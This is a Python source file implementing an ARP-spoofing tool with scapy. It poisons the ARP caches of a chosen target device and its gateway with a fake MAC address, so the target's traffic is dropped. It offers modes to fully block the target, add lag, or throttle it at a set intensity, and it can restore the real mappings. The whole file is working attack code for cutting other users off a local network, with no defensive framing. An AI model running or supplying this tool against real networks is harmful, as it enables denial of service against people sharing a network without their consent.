import random
import threading
import time

from scapy.all import ARP, Ether, conf, sendp

# A MAC address that doesn't exist on any real network.
# Poisoned devices send traffic here — it vanishes. We never receive it.
_DEAD_MAC = "de:ad:be:ef:de:ad"


class ARPSpoofer:

    def __init__(self, iface: str | None = None):
        self._iface  = iface or conf.route.route("0.0.0.0")[0]
        self._lock   = threading.Lock()
        self._active: dict[str, int] = {}   # ip -> token

    # ── public API ────────────────────────────────────────────────────────────

    def apply(self, target_ip: str, target_mac: str,
              gateway_ip: str, gateway_mac: str,
              mode: str = "block", intensity: int = 60) -> None:
        with self._lock:
            token = self._active.get(target_ip, 0) + 1
            self._active[target_ip] = token
        threading.Thread(
            target=self._run,
            args=(token, target_ip, target_mac, gateway_ip, gateway_mac, mode, intensity),
            daemon=True,
        ).start()

    def remove(self, target_ip: str, target_mac: str,
               gateway_ip: str, gateway_mac: str) -> None:
        with self._lock:
            self._active.pop(target_ip, None)
        # Restore in background so UI doesn't freeze
        threading.Thread(
            target=self._restore_loop,
            args=(target_ip, target_mac, gateway_ip, gateway_mac),
            daemon=True,
        ).start()

    def remove_all(self, devices: list[dict],
                   gateway_ip: str, gateway_mac: str) -> None:
        with self._lock:
            ips = list(self._active.keys())
            self._active.clear()
        for dev in devices:
            if dev["ip"] in ips:
                self._restore(dev["ip"], dev["mac"], gateway_ip, gateway_mac)

    def is_active(self, target_ip: str) -> bool:
        return target_ip in self._active

    def get_mode(self, target_ip: str) -> str:
        return "active" if target_ip in self._active else "normal"

    # ── thread ────────────────────────────────────────────────────────────────

    def _run(self, token: int, target_ip: str, target_mac: str,
             gateway_ip: str, gateway_mac: str, mode: str, intensity: int) -> None:

        def alive() -> bool:
            return self._active.get(target_ip) == token

        while alive():
            if mode == "block":
                self._poison(target_ip, target_mac, gateway_ip, gateway_mac)
                time.sleep(0.5)

            elif mode == "lag":
                block_t = 0.3 + (intensity / 100) * 2.7   # 0.3s – 3s
                allow_t = 0.5 - (intensity / 100) * 0.45  # 0.5s – 0.05s

                t0 = time.time()
                while alive() and time.time() - t0 < block_t:
                    self._poison(target_ip, target_mac, gateway_ip, gateway_mac)
                    time.sleep(0.1)

                if not alive():
                    break

                self._restore(target_ip, target_mac, gateway_ip, gateway_mac)
                time.sleep(allow_t)

            elif mode == "limit":
                if random.randint(1, 100) <= intensity:
                    self._poison(target_ip, target_mac, gateway_ip, gateway_mac)
                else:
                    self._restore(target_ip, target_mac, gateway_ip, gateway_mac)
                time.sleep(0.2)

    # ── ARP ───────────────────────────────────────────────────────────────────

    def _poison(self, target_ip: str, target_mac: str,
                gateway_ip: str, gateway_mac: str) -> None:
        """
        Tell both the target and the gateway that the other's IP maps to a
        non-existent MAC. Traffic drops on the switch — we never receive it,
        so our own connection stays untouched.
        """
        try:
            sendp([
                Ether(dst=target_mac)  / ARP(op=2, pdst=target_ip,  hwdst=target_mac,
                                             psrc=gateway_ip, hwsrc=_DEAD_MAC),
                Ether(dst=gateway_mac) / ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac,
                                             psrc=target_ip,  hwsrc=_DEAD_MAC),
            ], iface=self._iface, verbose=0)
        except Exception as e:
            print(f"[spoofer] poison failed: {e}")

    def _restore(self, target_ip: str, target_mac: str,
                 gateway_ip: str, gateway_mac: str, count: int = 8) -> None:
        """Send the real MAC mappings back to both sides."""
        if not target_mac or not gateway_mac:
            return
        try:
            sendp([
                Ether(src=gateway_mac, dst=target_mac)  / ARP(op=2, pdst=target_ip,
                      hwdst=target_mac,  psrc=gateway_ip, hwsrc=gateway_mac),
                Ether(src=target_mac,  dst=gateway_mac) / ARP(op=2, pdst=gateway_ip,
                      hwdst=gateway_mac, psrc=target_ip,  hwsrc=target_mac),
            ], iface=self._iface, verbose=0, count=count)
        except Exception as e:
            print(f"[spoofer] restore failed: {e}")

    def _restore_loop(self, target_ip: str, target_mac: str,
                      gateway_ip: str, gateway_mac: str) -> None:
        """Send restore packets in 3 bursts over 1.5s to guarantee ARP update."""
        for _ in range(3):
            self._restore(target_ip, target_mac, gateway_ip, gateway_mac, count=8)
            time.sleep(0.5)
